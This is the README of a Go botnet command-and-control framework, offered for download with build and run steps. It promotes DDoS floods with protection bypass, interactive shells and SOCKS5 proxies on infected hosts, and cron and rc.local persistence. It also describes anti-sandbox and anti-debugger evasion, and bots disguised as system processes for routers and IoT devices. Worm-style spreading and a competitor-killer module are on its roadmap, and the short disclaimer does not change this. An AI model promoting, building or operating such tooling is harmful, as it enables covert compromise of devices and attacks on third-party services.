
<div align="center">

# ☾℣☽ision C2

**Advanced Go-Based C2 Framework**  
**DDoS • SOCKS5 Proxying • Remote Shell • Multi-Architecture**

![VisionC2](https://img.shields.io/badge/VisionC2-V1.8-red?style=for-the-badge)
![Go](https://img.shields.io/badge/Go-1.23.0+-00ADD8?style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-009688?style=for-the-badge)
![License](https://img.shields.io/badge/License-GNU%20GPLv3-yellow?style=for-the-badge)

</div>

> Designed for red-team operations, stress testing, and large-scale agent management with built-in Layer 4/7 DDoS attacks, SOCKS5 proxying, interactive remote shell, and strong anti-analysis protections.

## 🧪 Quick Demo

![VisionC2 TUI Demo](https://github.com/user-attachments/assets/8f9b3263-1df4-4fe4-ad3b-d02bc5907c21)

## ✨ Features

### Bot Capabilities
- **Layer 4 Attacks** — UDP, TCP SYN/ACK/RST, GRE, DNS amplification, ICMP, NTP, SSDP, etc.
- **Layer 7 Attacks** — HTTP floods, HTTPS/TLS Bypass with realistic browser fingerprinting, Cloudflare UAM/bypass
- **Remote Shell** — Fully interactive per-bot shell + fire-and-forget broadcast execution
- **SOCKS5 Proxy** — Turn any infected host into a high-performance SOCKS5 proxy on demand

### CNC & TUI Interface
- Beautiful full-screen **Terminal User Interface** 
- Real-time bot grid with architecture, country, RAM, cores, and uptime
- Attack builder with live statistics
- Single-agent interactive shell
- Broadcast shell with powerful filters (OS, arch, RAM ≥ X GB, country, etc.)
- Built-in SOCKS5 proxy manager (start/stop per bot or in bulk)

### Encryption & Stealth
- TLS 1.3 + Perfect Forward Secrecy
- HMAC challenge-response authentication
- Multi-layer String obfuscation (RC4 → XOR → byte substitution → MD5)
- Anti-analysis: sandbox detection, VM checks, debugger detection
- C2 resolution via DoH + TXT records + A records + Direct IP 


## 🚀 Quick Start

### Prerequisites
```bash
sudo apt update && sudo apt install -y upx-ucl openssl git wget gcc python3 screen
# Go 1.23+ → https://go.dev/dl/
```

### Installation
```bash
git clone https://github.com/Syn2Much/VisionC2.git
cd VisionC2
python3 setup.py
# CNC and Bot Binaries will be built during this proccess
```

## ⚙️ Configuration

Code changes are made automatically via setup.py

Review `setup_config.txt` to see current:
* C2 address & ports
* Magic code & encryption keys
* Generated 4096-bit TLS certificates

---

### Running the C2
**Recommended (TUI)**
```bash
./server
```

**Split/Multi-user mode(Legacy Mode)**
```bash
./server --split
# Then connect with: nc <c2-ip> <admin-port>
```

Bot binaries are automatically cross-compiled to `bot/bins/`.

## Architecture Overview

```
[ Admin ] → [ C2 Server/TUI ] ↔ [ Bot Agents ]
                    │              │
            TLS 1.3 │              ├─ Persistence (cron/rc.local)
            HMAC Auth │            ├─ Multi-layer C2 Resolution
                    │              ├─ Sandbox Detection
                    │              └─ Encrypted Command Loop
                    │
                    └─ Issues HMAC challenge
                       Verifies response
                       Queues commands
```

**Authentication Flow**
1. Bot decrypts embedded C2 config (Base64 → XOR → RC4 → Byte Sub → MD5)
2. Resolves C2 via DoH TXT / DNS A records
3. TLS 1.3 handshake → HMAC challenge → MD5(ch + MAGIC + ch)
4. Successful auth → encrypted command loop

## 🧬 Supported Architectures & Stealth Binaries

| Binary Name   | Architecture | Target Platforms                     |
|---------------|--------------|--------------------------------------|
| `kworkerd0`   | x86 (386)    | Linux 32-bit                         |
| `ethd0`       | x86_64       | Linux 64-bit (most common)           |
| `mdsync1`     | ARMv7        | Raspberry Pi 2/3, older ARM devices  |
| `ip6addrd`    | ARM64        | Raspberry Pi 4, modern Android, AWS Graviton |
| `httpd`       | MIPS         | Routers, IoT devices                 |
| `...`         | +12 more     | PPC64, RISC-V, s390x, loong64, etc.  |

All binaries are UPX-packed, stripped, and named to blend with legitimate system processes.

## 📜 Documentation

| File                    | Description                                      |
|-------------------------|--------------------------------------------------|
| [USAGE.md](USAGE.md)    | Full setup, deployment, and TUI guide            |
| [COMMANDS.md](cnc/COMMANDS.md) | Complete CNC command reference              |
| [CHANGELOG.md](CHANGELOG.md) | Version history and breaking changes         |

## 🛣️ Roadmap

**In Progress**
- Finish TUI Updates
- Enhanced daemonization 
- Competitor locker / killer module

**Planned**
- Auto-generated DGA fallback domains
- Self-replication & worm-like spreading
- Single-instance port takeover


## ⚠️ Legal Disclaimer

**FOR AUTHORIZED SECURITY RESEARCH AND STRESS TESTING ONLY**

This software is provided strictly for educational, research, and authorized penetration testing purposes. The authors are not responsible for any misuse or legal consequences resulting from its use.

## 📜 License
GNU General Public License v3.0 — see [LICENSE](LICENSE)

## Support
- Open a GitHub Issue for bugs or feature requests
- Detailed documentation in `USAGE.md`
- Contact: `dev@sinners.city`

---

